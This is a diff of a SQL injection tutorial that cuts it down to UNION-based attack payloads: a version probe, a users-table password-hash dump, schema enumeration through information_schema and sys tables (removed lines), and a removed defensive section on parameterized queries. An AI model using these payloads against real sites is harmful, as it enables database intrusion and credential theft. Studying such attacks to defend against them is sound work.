@@ -87,112 +87,24 @@ Gifts' UNION SELECT 'AAA','BBB','CCC'--
 
 If the page prints `BBB`, then the second column is reflected.
 
-If strings fail (type mismatch), fall back to `NULL` for most columns and only use strings in likely text columns.
-
 ## Attack Examples
 
 ### Example A: Extract Database Version
 
-If 2 columns are required and the first column is reflected:
 ```
 Gifts' UNION SELECT @@version, NULL--
 ```
 
-Common alternatives:
-- MySQL: `version()`
-- PostgreSQL: `version()`
-- Oracle: `banner` from `v$version`
-
-### Example B: Read Current Database User
-
-```
-Gifts' UNION SELECT user(), NULL--
-```
-
-Alternatives:
-- PostgreSQL: `current_user`
-- SQL Server: `SYSTEM_USER`
-
-### Example C: Dump Users Table Data
-
-Assume the app query has 2 columns and prints the first column.
-
-If the database has a `users` table with `username` and `password_hash`:
+### Example B: Dump Users Table
 
 ```
 Gifts' UNION SELECT username, password_hash FROM users--
 ```
 
-If you only have **one reflected column**, combine fields into one string (DB-specific concatenation):
-- MySQL: `CONCAT(username,':',password_hash)`
-- PostgreSQL: `username || ':' || password_hash`
-- SQL Server: `username + ':' + password_hash`
-
-Example (MySQL style):
-```
-Gifts' UNION SELECT CONCAT(username,':',password_hash), NULL FROM users--
-```
-
-## Enumerating Tables and Columns
-
-If metadata is accessible, attackers can discover schema info.
-
-### Using `information_schema` (MySQL, PostgreSQL, many others)
-
-List tables:
-```
-Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--
-```
-
-List columns for a table:
-```
-Gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
-```
-
-### SQL Server Approach
-
-Tables:
-```
-Gifts' UNION SELECT name, NULL FROM sys.tables--
-```
-
-Columns:
-```
-Gifts' UNION SELECT name, NULL FROM sys.columns WHERE object_id = OBJECT_ID('users')--
-```
-
-## UNION vs UNION ALL
-
-- `UNION` removes duplicates (may be slower and can hide rows)
-- `UNION ALL` keeps duplicates (often preferred by attackers)
-
-Example:
-```
-Gifts' UNION ALL SELECT username, password_hash FROM users--
-```
-
 ## Common Reasons UNION Attacks Fail
 
 - Wrong number of columns
-- Data type mismatch (string vs integer)
-- Results are not displayed by the app
-- WAF or input filtering blocks keywords like `UNION`
-- Query uses different structure (e.g., `INSERT`, `UPDATE`)
-
-## Defensive Guidance
-
-1. **Use parameterized queries** everywhere
-2. **Avoid string concatenation** when building SQL
-3. Use least-privilege DB accounts
-4. Hide DB error messages from users
-5. Add allowlist validation for expected inputs
-6. Add monitoring for suspicious patterns (`UNION`, `'--`, `ORDER BY` probes)
-
-## Quick Safe Example
-
-Conceptual example:
-```sql
-SELECT name, price FROM products WHERE category = ? AND released = 1;
-```
-
-The database treats the input as **data**, not executable SQL, so `UNION` cannot change the query structure.
+- Data type mismatch
+- Results not displayed by app
+- WAF blocking keywords
+- Query uses different structure
